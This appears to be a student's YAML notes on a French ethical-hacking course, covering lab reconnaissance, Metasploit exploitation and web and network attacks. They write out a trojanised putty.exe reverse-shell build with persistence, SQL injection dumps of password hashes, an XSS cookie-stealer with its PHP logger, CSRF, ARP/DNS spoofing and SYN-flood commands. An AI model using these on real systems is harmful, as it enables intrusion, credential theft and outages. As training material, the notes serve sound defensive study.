udemy:
  deviens_un_hacker:
    author: Hamza KONDAH
    site: http://www.alphorm.com
    blog: http://blog.alphorm.com
    mail: kondah.hamza@gmail.com
    section_1:
      - name: 01_intro
        content:
          lien_utiles:
            - https://packetstormsecurity.com
            - http://www.securityfocus.com
            - www.securitytube.net
            - https://www.hackervoice.net
            - https://www.xmco.net
            - www.zataz.com
            - https://www.owasp.org
    section_2_Intro_a_la_secu:
      - name: 02_why
        content:
          what_we_can_do_with_data:
            - stop
            - sniff
            - update
            - add
      - name: 03_hack_and_voc_10
        content:
          etape_de_hacking:
            1. reconnaissance passive
            2. reconnaissance active
            3. gain d acces
            4. maintien d acces
            5. Effacer les traces
          naming:
            - collecte d info
              prise d emprinte: foot printing
              take max info
                adresse reseau
                nom de domaine
                protocole reseau
                system
                archi
                user
              social engineering:
                phone
                intenet
                lettre
                contact direct
            - balayage
              - adresse active du reseau
              - port ouvert
              - os
              - service
            - reperage de faille (vulnerability assessment)
              - cert
              - nessus
              - snort
              - metasploit
            - intrusion (exploitation tools)
              - injection de code
              - acces a des comptes valides
              - metasploit
            - compromision
            - porte derobe (backdoor)
            - netoyage de trace
      - name: 04_veille_11
        lien utiles:
          - www.zataz.com
          - packetstormsecurity.com
          - www.securityfocus.com
          - www.exploit-db.com
      - name: 05_tcp_ip_4
        def: Transmission Control Protocol/Internet Protocol
        archi:
          couche1: acces au reseau
            specifie la forme dans laquelle les donnees
          couche2: reseau (ou internet)
            fourni le packet de donnee
          couche3: Transport
          couche4: Applicatif
    section_3_Lab:
      - name: 06_lab_20
        machine_attaquante:
          kali linux
        metasploit:
          default_log:
            login: msfadmin
            pwd: msfadmin
        lien_utile:
          - https://community.rapid7.com/docs/DOC-1875
        cmd:
          - ifconfig: find network data
    section_4_Prise_d_info:
      - name: 07_public_info
        gather_info:
          website:
            - https://www.whois.net
              what_for: information sur le site
            - http://www.alexa.com
              what_for: information sur le site
            - http://www.archive.org
            - http://serversniff.net
          tools:
            - whois
              what_for: info on website
              cmd: whois www.google.fr
            - host
              what_for: have ip of a website
              cmd: host www.google.fr
            - maltego
              what_for: all about a person/thing on internet
              config:
                install transforms from: maltego public server
                ready to use: run a machine
              use:
                click and drag dns
                double click on it
                enter dns to find
                RMB on DNS -> DomainToDNSNameSchema
                RMB on server -> ToServerTechnologiesWebsite
            - dnsenum
              what_for: have ip of a website
              cmd: dnsenum www.google.com
            - dig
              what_for: have ip of a website
              cmd: dig www.google.fr
            - dmitry
              what_for: lot of info ... host, ip, desc, ...
              cmd:
                dmitry
                dmitry -iwnse www.google.com
            - tcptraceroute
              what_for: look to the path to access
              cmd: tcptraceroute www.google.fr
            - theharvester
              what_for: look for website/ip/mail
              cmd:
                theharvester -d <website_we_need_info> -l <number_of_line> -b <data_source>
                theharvester -d www.google.fr -l 100 -b google.com
      - name: 08_machine_list
        enumeration_des_machines: proces pour trouver et collecter des info sur une machine cible (ports, os, service)
        ping:
          desc: launch packet
          cmd:
            ping 192.168.24.10
            ping -c 1 192.168.24.10 # define number of packet
            ping -i eth0 -c 1 192.168.24.10 # define interface with which you launch packet
            ping -s 1024 192.168.24.10 # define size of packet
        wireshark:
          desc: analyse network transaction
          conf:
            choose network card
            eth0
            start
            launch ping with limit number of packet
        arping:
          desc: analyse machine
          cmd:
            arping 192.168.1.106
            arping 192.168.1.106 -c 1 # number of packet
            arping -d 192.168.1.106 -c 1 # ???
            arping -d -i eth0 192.168.1.106 -c 1 # choose interface
        fping:
          desc: as ping but multi machine
          cmd:
            fping 192.168.1.106
            fping 192.168.1.106 192.168.1.19
            fping -g 192.168.1.0/24 # scan all network
            fping -r 1 -g 192.168.1.0/24 # how many time you try to access
        hping3:
          desc: generate packet
          option:
            -0 --raw-ip raw-ip packet
            -1 --icmp icmp packet
            -2 --udp udp packet
            -8 --scan scan mode
            -9 --listen listen mode
          cmd:
            hping3 -1 192.168.1.19 -c 1
            hping3 192.168.1.106 -c 1 -S -p 22 -s 6060 # send 1 packet port 22
            hping3 -2 192.168.1.106 -c 1 -S -p 22 -s 6060 # same thing but udp packet
        nping:
          desc: packet tcp, udp, icmp, more detail
          cmd:
            nping -c 1 192.168.1.106
      - name: 09_scan_port_and_service_32
        nmap:
          desc: port scan open source
          cmd:
            nmap 192.168.1.106
            nmap 192.168.1.0/24 # scan all network
            nmap -sN -p 22,25 192.160.1.106
            nmap -sU -p 53,161 192.160.1.106 # UDP
            nmap -sV -p 80 192.160.1.106 # HTTP
            nmap -A 192.160.1.106 # agressiv scan, generate a file myscan.xml
            xsltproc myscan.xml -o myscan.html
        zenmap:
          desc: graphic nmap
        unicornscan:
          desc: as nmap
          cmd:
            unicornscan -h
            unicornscan -m U -Iv 192.168.1.106:1-65535
            unicornscan -m U -Iv 192.168.1.106:1-65535 -r 10000 # choose number of pps (default: 300)
        amap: ~
        nbtscan, SMB:
          cmd:
            nbtscan 192.168.1.1-255
            nbtscan -hv 192.168.1.1-255 # find service
        onesixtyone, SNMP:
          desc: find SMP profils
          cmd:
            onesixtyone 192.168.1.106
            onesixtyone -d 192.168.1.106
        nessus:
          desc: find weakness for a computeur, can call external services (as Hydra to attack password)
          install:
            dpkg -i Nessus
            /etc/init.d/nessusd start
            # -> localhost:8834
          cmd:
      - name: 10_system_fingerprint_6
        desc: find os data
        p0f:
          desc: (passive) check TCP packet, slow
          cmd:
            p0f -h
            p0f -i eth0 -p -o p0f.log # several minute, listening
        nmap:
          desc: fast
          cmd:
            nmap -O 192.168.1.106
    section_5_vuln_client:
      - name: 11_come_on_14
        armitage: ihm pour metasploit
        install:
          ask db/metasploit
          default_cred:
            msf
            msf
          start metasploit: yes
          host -> add host -> 192.168.1.106
            192.168.1.106-200
            192.168.1.106/24
          RMB -> scan
          Attack -> find attacks
          RMB -> attack -> all weakness you can try
          Attack -> Hall Mary -> launch exploit
          If succeed -> Command shell session
          RMB -> Shell -> Interact
      - name: 12_metasploit_21
        terminologie:
          exploit: moyen par lequel un attaquand profite d un defaut dans un systeme, une app, ou un service
          payload: code que nous voulons faire executer par le systeme et qui sera delivre par un framework
          shellcode: suite d instructions utilisees par un payload lors de l exploitation
          module: part de logiciel qui peut etre utilise par le framework metasploit
          listener: composant qui attend une connexion entrante
        launch: terminal -> msfconsole
        cmd:
          exploits:
            show exploits
            search vnc
            metasploit.com -> exploits
          payload:
            show payloads
            use <name exploit>
            use windows/browser/honeywell_tema_exec
            show payloads
            show options
          module:
            show auxiliary
            cd /usr/share/metasploit-framework/modules/auxiliary/scanner
            ls
          nasm:
            cd /usr/share/metasploit-framework/tools
            ./nasm.rb
            jmp esp
          msf:
            msfconsole
            msfcli
            armitage
            msfpayload
            msfencode
            nasm shell
        lab:
          msfconsole
          db_nmap -sV 192.168.1.106
          hosts
          services
          # attack service ftp: vsftpd 2.3.4
          search vsftpd 2.3.4
          # find exploit in it: exploit/unix/ftp/vsftpd_234_backdoor
          use exploit/unix/ftp/vsftpd_234_backdoor
          show options
          set RHOST 192.168.1.106
          show payloads
          exploit  # launch exploit
      - name: 13_ vuln_browser_8
        BeEF:
          desc: Browser Exploitation Framework (http://beefproject.com)
          cmd:
            beef-xss
            browser -> 127.0.0.1:3000
            cred -> beef:beef
            ihm -> online browser
              -> machine
              -> command
              -> browser
            term -> exemple
              -> copy
        Metasploit:
          cmd:
            msfconsole
            use auxilary/server/browser_autopwn
            show options
            set lhost 192.168.1.106
            set uripath hacking
            run
            # give Local IP
            borwser -> local ip
            term -> execute exploit
              sessions -i # check if you have sessions
      - name: 14_backdoor_10
        meterpreter:
          desc: extension of metasploit, use as payload, shell meterpreter, persistance module (metsvc)
          cmd:
            wget https://the.earth.li/~sgtatham/putty/latest/x86/putty.exe
            msfvenom -a x86 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=192.168.1.106 lport=3232 -e x86/shikata_ga_nai -i 3 -b "\x00" -f exe -o hello.exe
            file hello.exe
            msfconsole
            use exploit/multi/handler
            set payload windows/meterpreter/reverse_tcp
            set lhost 192.168.1.106
            set lport 3232
            exploit
            # on attacked machine launch hello.exe
            # on attack machine you have a shell
            ifconfig
            help
            screenshot
            # cool but if you close you lose connection
            # go persist
            run metsvc
        cymothoa:
          desc: inject code in process
        intersect:
          desc: post-exploit, get pwd file, SSH key, network info, scan secu soft
    section_6_vuln_web_105:
      - name: 15_intro_9
        OWASP: Open Web Application Security Project, make classment
        ZAP: OWASP Zed Attack Proxy
      - name: 16_site_carto_16
        desc:
          cartographie: get sitemap
          dynamic_site: footprint more than sitemap
        vega:
          desc:
            * open source platform to test web appli,
            * test SQL injection, XSS, info dealing,
            cmd:
              vega
              scan -> start new scan
                -> enter a base URI for scan
                -> www.kondah.com
                -> finish
              following redirection -> like to add to the scope -> yes
              all problem reveale are false positive, need to be test
        burp_suite:
          desc:
            * secu test on web appli
            * analyse, edit and replay request
          cmd:
            burpsuite
            # seems so better
      - name: 17_vuln_php_12
        desc:
          dvwa: platform to test vuln
          include:
            desc:
              <php include('config.php'); ?>
              is use very often
              2 way to exploit
                local: LFI (Locale File Include)
                remote: RFI (Remote File Include)
              when include in in url, you can change path
              google.com?page=config.php
              google.com?page=/etc/passwd
            protect:
              file_exist('name'); // check if file existe
              config .htacess // whitelist/blacklist file permit to include
          upload:
            still present
            permit backdoor
            exploit:
              double extension
              bypass mime verif
              destination repertory selection
            exemple:
              dvwa -> upload -> choose c99.php file
              burpsuite -> proxy -> intercept
              dvwa -> upload -> get request -> `Content-Type: "image/jpeg"`
            protect:
              * when upload -> rename with random name without extension
              * forbide special char (<>?&;) but be carreful with other encodage equivalent
              * forbid script exection
              * htacess
      - name: 18_sql_injection_20
        pwd: ' 1=1-- #'
        scenari:
          detection:
            mydomain.com/products/product.asp?productId=1
          injection:
            mydomain.com/products/product.asp?productId=123 UNION SELECT username, password FROM USERS
          result request:
            SELECT ProductName, ProductDescription FROM Products WHERE ProductId='123' UNION SELECT Username, Password FROM Users;
        tools:
          sqlmap:
            cmd:
              sqlmap -u "http://192.168.1.106/dvwa/vulnerabilities/sqli/?id=NULL&Submit=Submit#" --coockie="PHPSESSID=fc61cdb4d87a06e3310031367c3c5267; security=low" --dump
              other tools ? Y
              crack via dictio ? Y
          OWASP Zed Attack Proxy: ~
          Hash-identifier:
            cmd:
              hash-identifier
              # copy hash from dvwa
              # give the more probable crypto
              google -> md5cracker
        exemple:
          DVWA -> sql injection
          1'
          1' 1=1 UNION SELECT null,version() #
          1' 1=1 UNION SELECT null,table_name FROM INFORMATION_SCHEMA.tables #
          1' 1=1 UNION SELECT null,column_name FROM INFORMATION_SCHEMA.columns WHERE table_name='users'#
          1' 1=1 UNION SELECT null,concat(user,0x0a,password) FROM users#
          get pwd hash -> enjoy
        protect:
          - do not use interpretor
          - encode data before use interpretor
          - validate type with "white list"
          - minimize database right
      - name: 19_xss_cross_site_scripting_34
        javascript:alert(document.coockie);
        script:
          CS.php: >
            <?php
              $file = "coockies.txt"
              if(isset($_GET['cookie'])) {
                $handle = fopen($file, "a");
                fwrite($handle, $_GET['cookie']."\r\n");
                fclose($handle);
                echo "Ligne ajoutee<br/>";
              }

              $handle = fopen($file, "r");
              while($data = fgets($handle)) {
                echo $data."<br/>";
              }
              fclose($handle);
              ?>
            exemple2:
              DVWA -> XSS reflected
              hamza
              <script>alert('xss')</script>
              <script>location.replace("http://192.168.1.106/CS.php?coockie=" + document.coockie)</script>
          xss.php:
            <html>
            <?php $name = $_REQUEST['name']; ?>
            <html><body>Hello, <?php echo $name; ?>!</body></html>
            exemple:
              xsser
              xsser --gtk
              XSSer -> Intruder -> http://192.168.1.106/xss.php?name=hamza
                -> stat -> verbose -> fly !
        tools:
          BeEf:
            cmd:
              beef-xss
          XSSer: ~
          OWASP Zed Attack Proxy (ZAP): ~
            cmd:
              zaproxy
              persist zap session ? No
              Speed beginning -> Configure your browser -> Plug-n-Hack
              bowser -> preference -> advanced -> setting
                -> automatic proxy configure URL -> check
              zap -> historic -> RMB on a request -> attack -> balayage
                -> alert
          Mano military: ~
        protect:
          htmlspecialchars()
          htmlentities()
          strip_tags()
          don t print what user give you
      - name: 20_csrf_cross_site_request_forgery_11
        auto_cred:
          - session coockie
          - HTTP header
          - IP adress
          - SSL certs
          - windos domaine auth
        todo:
          DVWA -> CSRF
          # you can view src
          # you can see parameter in url
          ctrl+U -> copy form source code
          create csrf.html -> paste code
          in pwd_cur, pwd_new and pwd_conf add value (alphorm, hamza, hamza)
          change <form> attribut -> action="192.168.1.106/dcwa/vulnerabilities/csrf/?"
        protect:
          - add a token, not auto sent, to all  sensible request
          - token must be crypto sure
          - stock a token and add it to all form and link
    section_7_vuln_reseau_66:
      - name: 21_intro_4
        reseau sans fils plus vulnerable que filaire
        3 pilliers de la securite info:
          - analyser, detecter, verifier et coriger
          - traiter les problemes de vulnerabilites, la gestion des corectifs et audit
          - resoudre les problemes le plus rapidement et efficacement possible
        network auditing
          + patch management
          + vulnerability scanning
          = reports
      - name: 22_Idle_host_scanning_17
        desc: old but still in use, port scan, but with an other indentity
        script: >
          #!/usr/bin/python
          # idle_scan.py
          import os
          import sys
          from scapy.all import *

          def is_root():
            return os.getuid() == 0

          def run_scan(zombie, target, port):
            print '[*] Scan %s port %d using %s as zombie' % (target, port, zombie)
            # get zombie's IP id with a SYN/ACK
            p1 = sr1(IP(dst=zombie)/TCP(sport=12345,dport=(123),flag="SA"),verbose=0)
            initial_id = p1.id

            print('[+] Zombie initial IP id', initial_id)

            # SYN to target with spoofed IP from zombie
            p2 = send(IP(dst=zombie)/TCP(sport=12345,dport=(port),flags="S"),verbose=0)

            # SYN to target with spoofed IP with zombie
            p3 = sr1(IP(dst=zombie)/TCP(sport=1234,dport=(123),flag="SA"),verbose=0)
            final_id = p3.id

            print('[+] Zombie final IP id', final_id)

            if final_id - initial_id < 2:
              print('[+] Port %d : closed' % port)
            else:
              print('[+] Port %d : open' % port)

          if __name__ = '__main__':
            print
            if not is_root():
              print('[!] Must be run as root. Qutting')
              sys.exit(1)

            if len(sys.argv) < 4 or sys.argc[1] = '-h':
              print('Usage: idle_scan.py zombieIP targetIP targetPort')
              sys.exit(1)

            run_scan(sys.argv[1], sys.argv[2], int(sys.argv[3]))
        tools:
          nmap: ~
          hping3: ~
          scapy:
            desc: manipulation and injection of packet in network
        lab:
          hping3 192.168.1.106 -1
          scapy
          i = IP()
          i.display()
          i.dst = "192.168.1.108"
          i.display()
          u = UDP()
          u.display()
          u.dport
          u.dport = 123
          requete = (i/u)
          requete.display()
          reponse = sr1(requete)
          reponse.display()
          response = sr1(IP(dst="192.168.1.106")/UDP(dport=53),timeout=1,verbose=1)
          response.display()
          ./idle_scan.py 192.168.1.106 192.168.1.107 80
          nmap 192.168.1.107 -p 80
          ./idle_scan.py 192.168.1.106 192.168.1.107 445
          nmap 192.168.1.107 -p 445
          ./idle_scan.py 192.168.1.106 192.168.1.107 90
          nmap 192.168.1.107 -p 90
          nmap -sI 192.168.1.106 192.168.1.107 -p 80
      - name: 23_service_deny_8
        concept:
          DOS: resultat d un remplissage d une zone de stockage ou un canal de com jusqu a ce que l on ne puisse plus l utiliser
          Deny of service by smurf:
            desc:
              - attack server ping broadcast server
              - broadcast server pin network
              - all machine in the network answer to broadcast server
              - all machine in the network answer to target server
          Deny of service by SYN flood:
            lab:
              with_msf:
                msfconsole
                use auxiliary/dos/tcp/synflood
                show options
                set RHOST 192.168.1.106
                exploit
              with_scapy:
                scapy
                i = IP()
                i.display()
                i.dst = '192.168.1.106'
                i.display()
                ping = ICMP()
                ping.display()
                requete = (i/ping)
                send(requete)
                look_with_wireshark:
                  wireshark
                    -> eth0 -> start
                    filter -> ICMP
                scapy
                send(IP(dst="192.168.1.106",src="192.168.1.107")/ICMP(),count=100,verbose=1)
                send(IP(dst="192.168.1.106",src="192.168.1.107")/ICMP(),count=1000,verbose=1)

        tools:
          scapy
          metasploit
      - name: 24_network_sniffing_11
        tools:
          ettercap:
            desc: man in the middle for LAN, attack on protocole ARP ?
            lab:
              ettercap -G
              sniff -> unified sniffing -> eth0
              host -> host list -> host -> scan for host
              mitm -> ARP Poisoning -> sniff remote connections: check
              dvwa -> connection
          wireshark:
            desc: packet ananyser
            lab:
              wireshark -> eth0 -> start
              dvwa -> log
              wireshark -> HTTP post login.php
              you can see coockies and HTML Form URL Encoded -> username, password
      - name: 25_network_spoofing_10
        desc: send IP packet using source IP adress which is not the emiter machine one s
        tools:
          DNSChef:
            desc: Proxy DNS, permit to generate false Domaine request
            url: http://thesprawl.org/projects/dnschef/
            lab:
              dnschef --fakeip=192.168.133.129 --fakedomains alphorm.com --interface 192.168.133.149 -q
          Arpspoof:
            desc: sniff trafic, make ARP packet
            lab:
              arspoff -f 192.168.133.150 192.168.133.129
          ettercap:
            lab:
              ettercap -G
              sniff -> Unified sniffing -> eth0
                -> host -> host list (ctrl+H)
                -> host -> scan for hosts (ctrl+S)
              Mitm -> ARP poisoning
                -> sniff remote connection: check
                -> only poison one-way: check
              Plugins -> Manage the plugins (ctrl+P) -> dns_spoof
              on computer -> cd /etc/ettercap
              vi etter.dns
              alphorm.com A www.google.com -> alphorm.com A 192.168.133.129
              *.alphorm.com A www.google.com -> *.alphorm.com A 192.168.133.129
      - name: 26_man_in_the_middle_13
        tools:
          DriftNet:
            desc: catch snapshot of network trafic
          3vilTwinAttacker:
            desc: auto create fake access point
          ettercap: ~
          urlsnarf: ~
        lab:
          ettercap -G
          sniff -> unified sniffing (ctrl+u) -> eth0
          host -> host list (ctrl+h)
          host -> scna for hosts (ctrl+s)
          click on an host -> add to target 2
          mitm -> ARP poisoning -> sniff remote connections: check
          driftnet
          bowser -> google -> hacking -> search -> images
          urlsnarf -i eth0
          browser -> www.alphorm.com
          3vilTwin-Attacker
            module -> Arp Poison Attack (ctrl+q)
            scan
            target: 192.168.133.160 -> start attack
            template: gmail -> start server http
          cd /usr/share/3vilTwinAttacker/Templates/Phishing/Facebook/*.log
    section_8_vuln_app_44:
      - name: 27_intro_8
        link:
          - assembleur: http://asm.developpez.com
          - gestion de la memoire d un binaire: http://duartes.org/gustavo/blog/post/anatomy-of-a-program-in-memory
          - mecanismes de protection: https://www.corelan.be/index.php/2009/09/21/exploit-writing-tutorial-part-6-bypassing-stack-cookies-safeseh-hw-dep-and-aslr
        desc:
          program execution: charge in memory element to execute
          organisation is done by segmentation
      - name: 28_buffer_overflow_18
      - name: 29_integer_overflow_1
      - name: 30_format_string_8
      - name: 31_shellcode_intro_3
      - name: 32_secu_4
    section_9_contre_mesure_11:
      - name: 33_general_counter_11
        veille:
          links:
            secu elert:
            - http://www.cert.ssi.gouv.fr
            - https://www.exploit-db.com
            ref:
            - https://www.clusif.asso.fr/rss/doc
            - http://www.ssi.gouv.fr
            - https://www.information-security.fr
        intrusion:
          - regular test
          - audits (EBIOS, MEHARI, ...)
          - quality test
          links:
            - https://www.clusif.asso.fr
        right splitting:
          - think about it
          - study it before
          - journalisation
          - suivi
          - threat internal or external
          - threat accidental or not
        crypt:
          - with auth
          - base on solution (Kerberos, PGP, RSA-K)
          - IPSEC
          - Todo: One Time Pad
        firewall:
          - internet -> firewall
          - firewall -> LAN (client + some server)
          - firewall -> DMZ (mail + FTP + Web server)
        VPN: ~
        IDS/NIDS:
          IDS: Intrusion Detection System
          3 family:
            NIDS: Network Based Intrusion Detection System
            HIDS: HostBased Untrusion Detection System
            IDS hybrid: use NIDS and HIDS
          Snort: NIDS, free and open
    section_10_final_8:
      - name: 34_conclusion_8
        link:
          - http://www.zend-security.com
          - https://hakerzvoice.net
          - http://www.root-me.org
          - https://www.hacking-lab.com
          - https://www.newbiecontest.org
        book:
          - Hacking, securite et tests d intrusion avec metasploit
          - kali linux cookbook
          - Securite informatique, Ethical hacking, Apprendre l attaque pour se defendre
